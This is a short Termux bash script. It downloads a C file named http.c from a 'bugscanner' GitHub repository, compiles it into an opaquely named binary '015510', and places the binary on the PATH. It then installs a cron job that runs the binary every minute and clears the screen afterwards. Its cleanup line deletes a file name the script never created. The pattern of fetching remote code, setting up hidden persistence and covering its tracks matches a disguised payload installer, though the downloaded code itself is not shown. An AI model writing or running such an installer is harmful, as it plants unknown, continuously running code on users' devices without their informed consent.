#!/bin/bash

termux-setup-storage

pkg install cronie
pkg install build-essential -y


wget https://raw.githubusercontent.com/pirozas/bugscanner/main/http.c



gcc http.c -o 015510

mv 015510 $PREFIX/bin/015510



crontab -l > mycron
echo "* * * * * 015510" >> mycron
crontab mycron
rm mycron

crond

rm 015510.c

clear

